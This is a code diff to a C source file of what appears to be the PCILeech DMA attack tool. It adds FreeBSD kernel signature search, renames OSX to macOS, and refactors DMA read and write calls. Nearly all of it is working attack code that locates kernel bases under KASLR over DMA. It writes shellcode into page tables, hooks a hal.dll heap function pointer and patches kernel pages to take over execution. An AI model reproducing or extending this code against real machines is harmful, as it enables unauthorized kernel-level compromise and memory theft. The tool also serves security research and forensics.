@@ -15,7 +15,8 @@ typedef struct _PHYSICAL_MEMORY_RANGE {
 
 #define KMDDATA_OPERATING_SYSTEM_WINDOWS		0x01
 #define KMDDATA_OPERATING_SYSTEM_LINUX			0x02
-#define KMDDATA_OPERATING_SYSTEM_OSX			0x04
+#define KMDDATA_OPERATING_SYSTEM_MACOS			0x04
+#define KMDDATA_OPERATING_SYSTEM_FREEBSD		0x08
 
 /*
 * KMD DATA struct. This struct must be contained in a 4096 byte section (page).
@@ -25,7 +26,7 @@ typedef struct _PHYSICAL_MEMORY_RANGE {
 */
 typedef struct tdKMDDATA {
 	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
-	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/OSX).
+	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
 	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
 	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
 	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
@@ -42,18 +43,18 @@ typedef struct tdKMDDATA {
 	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
 	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
 	QWORD dataIn[28];				// [0x120]
-	QWORD dataOutExtraLength;		// [0x200] length of extra in-data.
+	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
 	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
-	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra in-data. 
+	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
 	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
-	QWORD dataOut[28];				// [0x220]
-	PVOID fn[32];					// [0x300] used by shellcode to store function pointers.
-	CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
-	CHAR ReservedFutureUse2[252];
-	CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
-	CHAR ReservedFutureUse3[252];
-	QWORD ReservedFutureUse4[255];	// [0x800]
-	QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
+QWORD dataOut[28];				// [0x220]
+PVOID fn[32];					// [0x300] used by shellcode to store function pointers.
+CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
+CHAR ReservedFutureUse2[252];
+CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
+CHAR ReservedFutureUse3[252];
+QWORD ReservedFutureUse4[255];	// [0x800]
+QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
 } KMDDATA, *PKMDDATA;
 
 typedef struct tdKMDHANDLE_S12 {
@@ -140,12 +141,20 @@ HRESULT KMD_FindSignature2(_Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ DWORD 
 
 HRESULT KMD_FindSignature1(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatchIdx)
 {
-	QWORD qwAddrCurrent = 0x100000;
-	PBYTE pbBuffer8M = LocalAlloc(0, 0x800000);
+	QWORD i, qwAddrCurrent = 0x100000;
+	PBYTE pbBuffer8M;
 	HRESULT hr;
 	PAGE_STATISTICS pageStat;
+	// special case (fixed memory location && zero signature byte length)
+	for(i = 0; i < cSignatures; i++) {
+		if((pSignatures[i].chunk[0].cbOffset > 0xfff) && (pSignatures[i].chunk[0].cb == 0) && (pSignatures[i].chunk[1].cbOffset > 0xfff) && (pSignatures[i].chunk[1].cb == 0)) {
+			pSignatures[i].chunk[0].qwAddress = pSignatures[i].chunk[0].cbOffset & ~0xFFF;
+			pSignatures[i].chunk[1].qwAddress = pSignatures[i].chunk[1].cbOffset & ~0xFFF;
+			return TRUE;
+		}
+	}
 	// initialize / allocate memory / load signatures
-	if(!pbBuffer8M) {
+	if(!(pbBuffer8M = LocalAlloc(0, 0x800000))) {
 		return E_OUTOFMEMORY;
 	}
 	memset(&pageStat, 0, sizeof(PAGE_STATISTICS));
@@ -156,7 +165,7 @@ HRESULT KMD_FindSignature1(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In
 	// loop kmd-find
 	while(qwAddrCurrent < pCfg->qwAddrMax && qwAddrCurrent < 0xffffffff) {
 		ShowUpdatePageRead(pCfg, qwAddrCurrent, &pageStat);
-		if(DeviceReadDMA(pDeviceData, (DWORD)qwAddrCurrent, pbBuffer8M, 0x800000)) {
+		if(DeviceReadDMA(pDeviceData, (DWORD)qwAddrCurrent, pbBuffer8M, 0x800000, 0)) {
 			pageStat.cPageSuccess += 2048;
 			hr = KMD_FindSignature2(pbBuffer8M, 2048, (DWORD)qwAddrCurrent, pSignatures, cSignatures, pdwSignatureMatchIdx);
 			if(SUCCEEDED(hr)) {
@@ -175,38 +184,34 @@ HRESULT KMD_FindSignature1(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _In
 }
 
 //-------------------------------------------------------------------------------
-// OSX generic kernel seek below.
+// macOS generic kernel seek below.
 //-------------------------------------------------------------------------------
 
-BOOL KMD_AppleIsKernelAddress(_In_ PBYTE pbPage)
+BOOL KMD_MacOSIsKernelAddress(_In_ PBYTE pbPage)
 {
-	BOOL isFoundKEXT = FALSE, isFoundBootPT = FALSE;
 	DWORD i;
 	if(*(PDWORD)pbPage != 0xfeedfacf) { return FALSE; } // mach_header_64 magic
 	if(*(PDWORD)(pbPage + 4) != 0x01000007) { return FALSE; } // mach_header_64 cputype
 	// search for kernel header data (eliminate other macho-headers)
 	for(i = 0x20; i < 0xfc0; i += 8) {
-		if(*(PQWORD)(pbPage + i) == 0x00737478656B5F5F) { // __kexts
-			isFoundKEXT = TRUE;
-		}
 		if(*(PQWORD)(pbPage + i) == 0x5450746f6F625F5F) { // __bootPT
-			isFoundBootPT = TRUE;
+			return TRUE;
 		}
 	}
-	return isFoundKEXT && isFoundBootPT;
+	return FALSE;
 }
 
-BOOL KMD_AppleKernelGetBase(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PDWORD pdwKernelBase, _Out_ PDWORD pdwTextHIB, _Out_ PDWORD pcbTextHIB)
+BOOL KMD_MacOSKernelGetBase(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PDWORD pdwKernelBase, _Out_ PDWORD pdwTextHIB, _Out_ PDWORD pcbTextHIB)
 {
 	BYTE pbPage[4096];
 	DWORD i, cKSlide;
 	for(cKSlide = 1; cKSlide <= 512; cKSlide++) {
 		*pdwKernelBase = cKSlide * 0x00200000; // KASLR = ([RND:1..512] * 0x00200000)
-		if(!DeviceReadDMARetryOnFail(pDeviceData, *pdwKernelBase, pbPage, 4096)) {
+		if(!DeviceReadDMA(pDeviceData, *pdwKernelBase, pbPage, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
 			printf("KMD: Failed. Error reading address: 0x%08x\n", *pdwKernelBase);
 			return FALSE;
 		}
-		if(KMD_AppleIsKernelAddress(pbPage)) {
+		if(KMD_MacOSIsKernelAddress(pbPage)) {
 			for(i = 0x20; i < 0xfc0; i += 8) {
 				if(*(PQWORD)(pbPage + i) == 0x0000747865745F5F && *(PQWORD)(pbPage + i + 0x10) == 0x0000004249485F5F) { // __text && __HIB
 					*pdwTextHIB = (DWORD)*(PQWORD)(pbPage + i + 0x20);
@@ -219,30 +224,78 @@ BOOL KMD_AppleKernelGetBase(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _O
 	return FALSE;
 }
 
-BOOL KMD_AppleKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PSIGNATURE pSignature)
+BOOL KMD_MacOSKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PSIGNATURE pSignature)
 {
-	const BYTE SIGNATURE_BCOPY[] = { 
-		0x48, 0x87, 0xF7, 0x48, 0x89, 0xD1, 0x48, 0x89, 0xF8, 0x48, 0x29, 0xF0, 0x48, 0x39, 0xC8, 0x72 };
+	const BYTE SIGNATURE_BCOPY[] = { 0x48, 0x87, 0xF7, 0x48, 0x89, 0xD1, 0x48, 0x89, 0xF8, 0x48, 0x29, 0xF0, 0x48, 0x39, 0xC8, 0x72 };
 	DWORD i, dwKernelBase, dwTextHIB, cbTextHIB;
 	PBYTE pbTextHIB;
-	if(!KMD_AppleKernelGetBase(pCfg, pDeviceData, &dwKernelBase, &dwTextHIB, &cbTextHIB)) {
+	if(!KMD_MacOSKernelGetBase(pCfg, pDeviceData, &dwKernelBase, &dwTextHIB, &cbTextHIB)) {
 		return FALSE;
 	}
 	cbTextHIB = (cbTextHIB + 0xfff) & 0xfffff000;
 	pbTextHIB = LocalAlloc(0, cbTextHIB);
 	if(!pbTextHIB) { return FALSE; }
-	if(!DeviceReadDMARetryOnFail(pDeviceData, dwTextHIB, pbTextHIB, cbTextHIB)) {
+	if(!DeviceReadDMA(pDeviceData, dwTextHIB, pbTextHIB, cbTextHIB, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
 		LocalFree(pbTextHIB);
 		return FALSE;
 	}
 	for(i = 0; i < cbTextHIB - 0x300; i++) {
 		if(0 == memcmp(pbTextHIB + i, SIGNATURE_BCOPY, 16)) {
-			Util_CreateSignatureAppleGeneric(dwKernelBase, dwTextHIB + i, dwTextHIB + cbTextHIB - 0x300, pSignature);
+			Util_CreateSignatureMacOSGeneric(dwKernelBase, dwTextHIB + i, dwTextHIB + cbTextHIB - 0x300, pSignature);
 			LocalFree(pbTextHIB);
 			return TRUE;
 		}
 	}
 	LocalFree(pbTextHIB);
+	return FALSE;
+}
+
+//-------------------------------------------------------------------------------
+// FreeBSD generic kernel seek below.
+//-------------------------------------------------------------------------------
+
+BOOL KMD_FreeBSDKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PSIGNATURE pSignature)
+{
+	DWORD i, dwo_memcpy_str, dwo_strtab, dwa_memcpy;
+	PBYTE pb64M = LocalAlloc(LMEM_ZEROINIT, 0x04000000);
+	if(!pb64M) { return FALSE; }
+	for(i = 0x01000000; i < 0x04000000; i += 0x01000000) {
+		DeviceReadDMA(pDeviceData, i, pb64M + i, 0x01000000, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	}
+	// 1: search for string 'vn_open'
+	i = 0;
+	while(TRUE) {
+		i++;
+		if(i > 0x04000000 - 0x1000) { goto error; }
+		if(0 == memcmp(pb64M + i, "\0vn_open", 9)) { break; }
+	}
+	dwo_memcpy_str = i + 1;
+	i = i & ~3;
+	// 2: scan backwards for base of strtab
+	while(TRUE) {
+		i -= 4;
+		if(i < 0x1000) { goto error; }
+		if(0 == *(PDWORD)(pb64M + i - 4)) { 
+			DWORD dwbug = *(PDWORD)(pb64M + i - 4);
+			break; 
+		}
+	}
+	dwo_strtab = i;
+	i = i - 8; // skip necessary
+	// 3: scan backwards for 'vn_open' function address
+	while(TRUE) {
+		i -= 0x18;
+		if(i < 0x1000) { goto error; }
+		if(0 == *(PQWORD)(pb64M + i)) { goto error; }
+		if(dwo_memcpy_str - dwo_strtab == *(PDWORD)(pb64M + i)) { break; }
+	}
+	dwa_memcpy = *(PDWORD)(pb64M + i + 8) & 0x7fffffff;
+	// 4: create signature
+	LocalFree(pb64M);
+	Util_CreateSignatureFreeBSDGeneric(dwo_strtab, dwa_memcpy, pSignature);
+	return TRUE;
+error:
+	LocalFree(pb64M);
 	return FALSE;
 }
 
@@ -326,14 +379,15 @@ BOOL KMD_LinuxKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceDa
 		// read 16M of memory first, if KASLR read 2M chunks at top of analysis buffer (performance reasons).
 		dwKernelBase = 0x01000000 + cKSlide * 0x00200000; // KASLR = 16M + ([RND:0..511] * 2M) ???
 		if(cKSlide == 0) {
-			DeviceReadDMARetryOnFail(pDeviceData, dwKernelBase, pb, 0x01000000);
+			DeviceReadDMA(pDeviceData, dwKernelBase, pb, 0x01000000, PCILEECH_MEM_FLAG_RETRYONFAIL);
 		} else {
 			memmove(pb, pb + 0x00200000, CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000);
-			result = DeviceReadDMARetryOnFail(
+			result = DeviceReadDMA(
 				pDeviceData,
 				dwKernelBase + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
 				pb + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
-				0x00200000);
+				0x00200000,
+				PCILEECH_MEM_FLAG_RETRYONFAIL);
 		}
 		result = 
 			KMD_LinuxFindFunctionAddr(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2) &&
@@ -348,7 +402,7 @@ BOOL KMD_LinuxKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceDa
 }
 
 //-------------------------------------------------------------------------------
-// Windows 8/10 generic kernel signature below.
+// Windows 8/10 generic kernel implant below.
 //-------------------------------------------------------------------------------
 
 BOOL KMD_Win_SearchTableHalpInterruptController(_In_ PBYTE pbPage, _In_ QWORD qwPageVA, _Out_ PDWORD dwHookFnPgOffset)
@@ -385,7 +439,7 @@ BOOL KMDOpen_HalHeapHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	// 1: Fetch hal.dll heap and perform sanity checks.
 	//------------------------------------------------
 	Util_CreateSignatureWindowsHalGeneric(&oSignature);
-	result = DeviceReadDMARetryOnFail(pDeviceData, ADDR_HAL_HEAP_PA, pbHal, 0x1000);
+	result = DeviceReadDMA(pDeviceData, ADDR_HAL_HEAP_PA, pbHal, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
 	qwPML4 = *(PQWORD)(pbHal + 0xa0);
 	qwAddrHalHeapVA = *(PQWORD)(pbHal + 0x78);
 	if(!result || (qwPML4 & 0xffffffff00000fff) || ((qwAddrHalHeapVA & 0xfffffffffff00fff) != 0xffffffffffd00000)) {
@@ -404,7 +458,7 @@ BOOL KMDOpen_HalHeapHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 		result =
 			Util_PageTable_ReadPTE(pCfg, pDeviceData, qwPML4, qwAddrHalHeapVA, &qwPTEOrig, &qwPTEPA) &&
 			((qwPTEOrig & 0x00007fff00000003) == 0x00000003) &&
-			DeviceReadDMARetryOnFail(pDeviceData, (qwPTEOrig & 0xfffff000), pbHal, 0x1000) &&
+			DeviceReadDMA(pDeviceData, (qwPTEOrig & 0xfffff000), pbHal, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL) &&
 			KMD_Win_SearchTableHalpInterruptController(pbHal, qwAddrHalHeapVA, &dwHookFnPgOffset);
 		if(result) {
 			break;
@@ -415,7 +469,7 @@ BOOL KMDOpen_HalHeapHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 		goto fail;
 	}
 	qwPTPA = qwPTEPA & ~0xfff;
-	result = DeviceReadDMARetryOnFail(pDeviceData, (DWORD)qwPTPA, pbPT, 0x1000);
+	result = DeviceReadDMA(pDeviceData, (DWORD)qwPTPA, pbPT, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
 	if(!result || memcmp(pbPT, pbNULL, 0x300)) { // first 0x300 bytes in Hal PT must be zero
 		printf("KMD: Failed. Error reading or interpreting PT.\n");
 		goto fail;
@@ -423,18 +477,18 @@ BOOL KMDOpen_HalHeapHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	//------------------------------------------------
 	// 3: Write shellcode into page table empty space.
 	//------------------------------------------------
-	*(PQWORD)pbPT = qwPTPA | 0x63; // PTE for addr: 0xffffffffffc00000
+	*(PQWORD)pbPT = qwPTPA | 0x63; // PTE for addr: 0xffffffffffc00000 
 	memcpy(pbPT + 0x100, oSignature.chunk[3].pb, oSignature.chunk[3].cb);
 	*(PQWORD)(pbPT + 0x100 + STAGE2_OFFSET_FN_STAGE1_ORIG) = *(PQWORD)(pbHal + dwHookFnPgOffset);
 	*(PQWORD)(pbPT + 0x100 + STAGE2_OFFSET_EXTRADATA1) = qwAddrHalHeapVA + dwHookFnPgOffset;
 	printf("INFO: PA PT:     0x%08x\n", qwPTPA);
 	printf("INFO: PA FN:     0x%08x\n", (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset);
-	DeviceWriteDMA_Retry(pDeviceData, (DWORD)qwPTPA, pbPT, 0x300);
+	DeviceWriteDMA(pDeviceData, qwPTPA, pbPT, 0x300, PCILEECH_MEM_FLAG_RETRYONFAIL);
 	//------------------------------------------------
 	// 4: Place hook by overwriting function addr in hal.dll heap.
 	//------------------------------------------------
 	Sleep(250);
-	DeviceWriteDMA_Retry(pDeviceData, (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset, (PBYTE)&ADDR_SHELLCODE_VA, sizeof(QWORD));
+	DeviceWriteDMA(pDeviceData, (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset, (PBYTE)&ADDR_SHELLCODE_VA, sizeof(QWORD), PCILEECH_MEM_FLAG_RETRYONFAIL);
 	printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
 	//------------------------------------------------
 	// 5: wait for patch to reveive execution.
@@ -442,7 +496,7 @@ BOOL KMDOpen_HalHeapHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	pdwPhysicalAddress = (PDWORD)(pbPT + 0x100 + STAGE2_OFFSET_STAGE3_PHYSADDR);
 	do {
 		Sleep(100);
-		if(!DeviceReadDMARetryOnFail(pDeviceData, (DWORD)qwPTPA, pbPT, 4096)) {
+		if(!DeviceReadDMA(pDeviceData, (DWORD)qwPTPA, pbPT, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
 			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
 			goto fail;
 		}
@@ -452,7 +506,7 @@ BOOL KMDOpen_HalHeapHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	// 6: Restore hooks to original.
 	//------------------------------------------------
 	Sleep(250);
-	DeviceWriteDMA(pDeviceData, (DWORD)qwPTPA, pbNULL, 0x300);
+	DeviceWriteDMA(pDeviceData, qwPTPA, pbNULL, 0x300, 0);
 	//------------------------------------------------
 	// 7: Set up kernel module shellcode (stage3)
 	//------------------------------------------------
@@ -460,11 +514,11 @@ BOOL KMDOpen_HalHeapHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 		printf("KMD: Failed. Stage2 shellcode error.\n");
 		goto fail;
 	}
-	DeviceWriteDMA(pDeviceData, *pdwPhysicalAddress + 0x1000, oSignature.chunk[4].pb, 4096);
+	DeviceWriteDMA(pDeviceData, *pdwPhysicalAddress + 0x1000, oSignature.chunk[4].pb, 4096, 0);
 	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { goto fail; }
 	pKMD->dwPageAddr32 = *pdwPhysicalAddress;
 	pKMD->status = (PKMDDATA)pKMD->pbPageData;
-	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096);
+	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096, 0);
 	//------------------------------------------------
 	// 8: Retrieve physical memory range map and complete open action.
 	//------------------------------------------------
@@ -499,12 +553,11 @@ BOOL KMD_IsRangeInPhysicalMap(_In_ PKMDHANDLE phKMD, _In_ QWORD qwBaseAddress, _
 BOOL KMD_SubmitCommand(_In_ PDEVICE_DATA pDeviceData, _Inout_ PKMDHANDLE phKMD, _In_ QWORD op)
 {
 	phKMD->status->_op = op;
-	if(!DeviceWriteDMA(pDeviceData, phKMD->dwPageAddr32, phKMD->pbPageData, 4096)) {
+	if(!DeviceWriteDMA(pDeviceData, phKMD->dwPageAddr32, phKMD->pbPageData, 4096, 0)) {
 		return FALSE;
 	}
 	do {
-		//Sleep(100);
-		if(!DeviceReadDMARetryOnFail(pDeviceData, phKMD->dwPageAddr32, phKMD->pbPageData, 4096)) {
+		if(!DeviceReadDMA(pDeviceData, phKMD->dwPageAddr32, phKMD->pbPageData, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
 			return FALSE;
 		}
 	} while(((phKMD->status->_op != KMD_CMD_COMPLETED) || (phKMD->status->_status != 1)) && phKMD->status->_status < 0x0fffffff);
@@ -520,7 +573,7 @@ BOOL KMD_GetPhysicalMemoryMap(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, 
 	}
 	phKMD->pPhysicalMap = LocalAlloc(LMEM_ZEROINIT, (phKMD->status->_size + 0x1000) & 0xfffff000);
 	if(!phKMD->pPhysicalMap) { return FALSE; }
-	DeviceReadDMA(pDeviceData, (DWORD)phKMD->status->DMAAddrPhysical, (PBYTE)phKMD->pPhysicalMap, (DWORD)((phKMD->status->_size + 0x1000) & 0xfffff000));
+	DeviceReadDMA(pDeviceData, phKMD->status->DMAAddrPhysical, (PBYTE)phKMD->pPhysicalMap, (DWORD)((phKMD->status->_size + 0x1000) & 0xfffff000), 0);
 	phKMD->cPhysicalMap = phKMD->status->_size / sizeof(PHYSICAL_MEMORY_RANGE);
 	// adjust max memory according to physical memory
 	qwMaxMemoryAddress = phKMD->pPhysicalMap[phKMD->cPhysicalMap - 1].BaseAddress;
@@ -548,7 +601,7 @@ BOOL KMDReadMemory_DMABufferSized(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAd
 	if(!result) { return FALSE; }
 	result = KMD_SubmitCommand(pDeviceData, phKMD, KMD_CMD_READ);
 	if(!result) { return FALSE; }
-	return DeviceReadDMA(pDeviceData, (DWORD)phKMD->status->DMAAddrPhysical, pb, cb);
+	return DeviceReadDMA(pDeviceData, phKMD->status->DMAAddrPhysical, pb, cb, 0);
 }
 
 BOOL KMDWriteMemory_DMABufferSized(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWORD cb)
@@ -556,7 +609,7 @@ BOOL KMDWriteMemory_DMABufferSized(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwA
 	BOOL result;
 	PKMDHANDLE phKMD = (PKMDHANDLE)pDeviceData->KMDHandle;
 	if(!KMD_IsRangeInPhysicalMap(phKMD, qwAddress, cb) && !pDeviceData->IsAllowedAccessReservedAddress) { return E_FAIL; }
-	result = DeviceWriteDMA(pDeviceData, (DWORD)phKMD->status->DMAAddrPhysical, pb, cb);
+	result = DeviceWriteDMA(pDeviceData, phKMD->status->DMAAddrPhysical, pb, cb, 0);
 	if(!result) { return FALSE; }
 	phKMD->status->_size = cb;
 	phKMD->status->_address = qwAddress;
@@ -626,9 +679,15 @@ BOOL KMDOpen_MemoryScan(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 			goto fail;
 		}
 		pSignature = &oSignatures[0];
-	} else if(0 == _stricmp(pCfg->szKMDName, "OSX_X64")) {
-		if(!KMD_AppleKernelSeekSignature(pCfg, pDeviceData, &oSignatures[0])) {
-			printf("KMD: Failed. Error locating generic OSX kernel signature.\n");
+	} else if((0 == _stricmp(pCfg->szKMDName, "MACOS")) || (0 == _stricmp(pCfg->szKMDName, "OSX_X64"))) {
+		if(!KMD_MacOSKernelSeekSignature(pCfg, pDeviceData, &oSignatures[0])) {
+			printf("KMD: Failed. Error locating generic macOS kernel signature.\n");
+			goto fail;
+		}
+		pSignature = &oSignatures[0];
+	} else if(0 == _stricmp(pCfg->szKMDName, "FREEBSD_X64")) {
+		if(!KMD_FreeBSDKernelSeekSignature(pCfg, pDeviceData, &oSignatures[0])) {
+			printf("KMD: Failed. Error locating generic FreeBSD kernel signature.\n");
 			goto fail;
 		}
 		pSignature = &oSignatures[0];
@@ -658,8 +717,8 @@ BOOL KMDOpen_MemoryScan(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	ph2->dwPageAddr32 = (DWORD)pSignature->chunk[1].qwAddress;
 	ph1->dwPageOffset = 0xfff & pSignature->chunk[2].cbOffset;
 	ph2->dwPageOffset = 0xfff & pSignature->chunk[3].cbOffset;
-	DeviceReadDMARetryOnFail(pDeviceData, ph1->dwPageAddr32, ph1->pbOrig, 4096);
-	DeviceReadDMARetryOnFail(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096);
+	DeviceReadDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbOrig, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL);
+	DeviceReadDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL);
 	memcpy(ph1->pbPatch, ph1->pbOrig, 4096);
 	memcpy(ph2->pbPatch, ph2->pbOrig, 4096);
 	memcpy(ph1->pbPatch + ph1->dwPageOffset, pSignature->chunk[2].pb, pSignature->chunk[2].cb);
@@ -673,11 +732,11 @@ BOOL KMDOpen_MemoryScan(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	//------------------------------------------------
 	// 4: Write patched data to memory.
 	//------------------------------------------------
-	if(!DeviceWriteDMAVerify(pDeviceData, ph2->dwPageAddr32, ph2->pbPatch, 4096)) {
+	if(!DeviceWriteDMAVerify(pDeviceData, ph2->dwPageAddr32, ph2->pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
 		printf("KMD: Failed. Signature found but unable write #2.\n");
 		goto fail;
 	}
-	if(!DeviceWriteDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbPatch, 4096)) { // stage1 (must be written after stage2)
+	if(!DeviceWriteDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbPatch, 4096, 0)) { // stage1 (must be written after stage2)
 		printf("KMD: Failed. Signature found but unable write #1.\n");
 		goto fail;
 	}
@@ -688,7 +747,7 @@ BOOL KMDOpen_MemoryScan(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	pdwPhysicalAddress = (PDWORD)(ph2->pbLatest + ph2->dwPageOffset + STAGE2_OFFSET_STAGE3_PHYSADDR);
 	do {
 		Sleep(100);
-		if(!DeviceReadDMARetryOnFail(pDeviceData, ph2->dwPageAddr32, ph2->pbLatest, 4096)) {
+		if(!DeviceReadDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbLatest, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
 			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
 			goto fail;
 		}
@@ -697,7 +756,7 @@ BOOL KMDOpen_MemoryScan(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	//------------------------------------------------
 	// 6: Restore hooks to original.
 	//------------------------------------------------
-	DeviceWriteDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096);
+	DeviceWriteDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096, 0);
 	//------------------------------------------------
 	// 7: Set up kernel module shellcode (stage3)
 	//------------------------------------------------
@@ -705,11 +764,11 @@ BOOL KMDOpen_MemoryScan(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 		printf("KMD: Failed. Stage2 shellcode error.\n");
 		goto fail;
 	}
-	DeviceWriteDMA(pDeviceData, *pdwPhysicalAddress + 0x1000, pSignature->chunk[4].pb, 4096);
+	DeviceWriteDMA(pDeviceData, *pdwPhysicalAddress + 0x1000, pSignature->chunk[4].pb, 4096, 0);
 	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { goto fail; }
 	pKMD->dwPageAddr32 = *pdwPhysicalAddress;
 	pKMD->status = (PKMDDATA)pKMD->pbPageData;
-	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096);
+	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096, 0);
 	//------------------------------------------------
 	// 8: Retrieve physical memory range map and complete open action.
 	//------------------------------------------------
@@ -812,16 +871,16 @@ BOOL KMDOpen_PageTableHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
 	//------------------------------------------------
 	// 4: Write patched data and PTEs to memory.
 	//------------------------------------------------
-	DeviceReadDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbOrig, 4096);
-	DeviceReadDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096);
-	if(!DeviceWriteDMAVerify(pDeviceData, ph2->dwPageAddr32, ph2->pbPatch, 4096) ||
-		!DeviceWriteDMAVerify(pDeviceData, ph1->dwPageAddr32, ph1->pbPatch, 4096)) {
+	DeviceReadDMA(pDeviceData, ph1->dwPageAddr32, ph1->pbOrig, 4096, 0);
+	DeviceReadDMA(pDeviceData, ph2->dwPageAddr32, ph2->pbOrig, 4096, 0);
+	if(!DeviceWriteDMAVerify(pDeviceData, ph2->dwPageAddr32, ph2->pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL) ||
+		!DeviceWriteDMAVerify(pDeviceData, ph1->dwPageAddr32, ph1->pbPatch, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
 		printf("KMD: Failed. Signature found but unable write.\n");
 		goto fail;
 	}
-	DeviceWriteDMA(pDeviceData, (DWORD)ph2->qwPTEAddrPhys, (PBYTE)&ph2->qwPTE, sizeof(QWORD));
+	DeviceWriteDMA(pDeviceData, ph2->qwPTEAddrPhys, (PBYTE)&ph2->qwPTE, sizeof(QWORD), 0);
 	Sleep(250);
